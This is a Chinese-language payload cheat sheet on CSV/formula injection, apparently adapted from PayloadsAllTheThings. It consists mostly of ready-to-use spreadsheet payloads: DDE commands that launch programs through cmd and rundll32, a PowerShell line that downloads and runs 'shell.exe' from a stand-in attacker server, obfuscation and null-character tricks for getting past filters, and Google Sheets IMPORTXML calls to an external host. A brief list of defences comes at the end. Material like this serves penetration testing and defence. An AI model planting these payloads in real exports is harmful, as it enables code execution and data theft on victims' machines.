# CSV Injection - CSV注入

[SEARCH_KEYWORDS]
漏洞类型: CSV Injection CSV注入 Formula Injection 公式注入
攻击类型: Remote Code Execution Command Injection Data Exfiltration
关键词: CSV Excel LibreOffice OpenOffice DDE formula spreadsheet
技术: DDE Dynamic Data Exchange PowerShell Download Execute
字符: = + - @

[CONTENT]

## CSV注入概述

CSV注入(公式注入)是一种安全漏洞，当不受信任的输入被包含在CSV文件中，且用户在Excel、LibreOffice或OpenOffice中打开时，可能导致单元格内容被执行。

## 公式触发字符

任何公式可以以以下字符开始：

```powershell
=
+
–
@
```

## DDE攻击Payload

### 执行计算器

```powershell
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
=cmd|' /C calc'!'A1'
```

### PowerShell下载执行

```powershell
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

### 前缀混淆和命令链

```powershell
=AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
=cmd|'/c calc.exe'!A*cmd|'/c calc.exe'!A
=         cmd|'/c calc.exe'!A
```

### 使用rundll32

```powershell
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll321234567890abcdefghijklmnopqrstuvwxyz|'URL.dll,OpenURL calc.exe'!A
```

### 空字符绕过

```powershell
=    C    m D                    |        '/        c       c  al  c      .  e                  x       e  '   !   A
```

空字符不是空格，执行时被忽略，可绕过字典过滤器。

## Google Sheets公式注入

Google Sheets允许使用额外公式获取远程URL：

```text
IMPORTXML(url, xpath_query, locale)
IMPORTRANGE(spreadsheet_url, range_string)
IMPORTHTML(url, query, index)
IMPORTFEED(url, [query], [headers], [num_items])
IMPORTDATA(url)
```

### 盲注测试

```text
=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
```

注意：会有警告提示公式尝试连接外部资源，需要用户授权。

## Payload技术细节

- `cmd` - 服务器响应客户端访问时的名称
- `/C calc` - 文件名（这里是calc.exe）
- `!A0` - 数据项名称，指定服务器响应客户端请求的数据单元

## 防护措施

1. 对CSV导出进行输入验证
2. 转义特殊字符(=, +, -, @)
3. 使用文本格式标识符
4. 禁用DDE功能

## 参考文档

原始来源: PayloadsAllTheThings/CSV Injection/README.md